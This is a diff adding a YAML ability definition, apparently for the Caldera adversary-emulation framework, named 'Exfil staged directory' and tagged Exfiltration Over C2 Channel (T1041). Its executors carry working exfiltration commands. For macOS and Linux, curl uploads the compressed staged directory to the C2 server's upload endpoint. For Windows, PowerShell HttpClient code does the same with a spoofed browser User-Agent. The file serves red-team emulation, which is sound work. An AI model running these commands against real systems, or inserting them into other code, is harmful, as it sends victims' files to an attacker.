@@ -1,0 +1,138 @@
+ability_id: ea713bc4-63f0-491c-9a6f-0b01d560b87e
+access: {}
+additional_info: {}
+buckets:
+- exfiltration
+delete_payload: true
+description: Exfil the staged directory
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}"
+    #{server}/file/upload'
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: darwin
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}"
+    #{server}/file/upload'
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '$ErrorActionPreference = ''Stop'';
+
+    $fieldName = "#{host.dir.compress}";
+
+    $filePath = "#{host.dir.compress}";
+
+    $url = "#{server}/file/upload";
+
+
+    Add-Type -AssemblyName ''System.Net.Http'';
+
+
+    $client = New-Object System.Net.Http.HttpClient;
+
+    $content = New-Object System.Net.Http.MultipartFormDataContent;
+
+    $fileStream = [System.IO.File]::OpenRead($filePath);
+
+    $fileName = [System.IO.Path]::GetFileName($filePath);
+
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+
+    $content.Add($fileContent, $fieldName, $fileName);
+
+    $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + ''-#{paw}'');
+
+    $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0;
+    Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+
+
+    $result = $client.PostAsync($url, $content).Result;
+
+    $result.EnsureSuccessStatusCode();'
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '$ErrorActionPreference = ''Stop'';
+
+    $fieldName = "#{host.dir.compress}";
+
+    $filePath = "#{host.dir.compress}";
+
+    $url = "#{server}/file/upload";
+
+
+    Add-Type -AssemblyName ''System.Net.Http'';
+
+
+    $client = New-Object System.Net.Http.HttpClient;
+
+    $content = New-Object System.Net.Http.MultipartFormDataContent;
+
+    $fileStream = [System.IO.File]::OpenRead($filePath);
+
+    $fileName = [System.IO.Path]::GetFileName($filePath);
+
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+
+    $content.Add($fileContent, $fieldName, $fileName);
+
+    $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + ''-#{paw}'');
+
+    $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0;
+    Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+
+
+    $result = $client.PostAsync($url, $content).Result;
+
+    $result.EnsureSuccessStatusCode();'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Exfil staged directory
+plugin: stockpile
+privilege: ''
+repeatable: false
+requirements:
+- module: plugins.stockpile.app.requirements.paw_provenance
+  relationship_match:
+  - source: host.dir.compress
+singleton: false
+tactic: exfiltration
+technique_id: T1041
+technique_name: Exfiltration Over C2 Channel
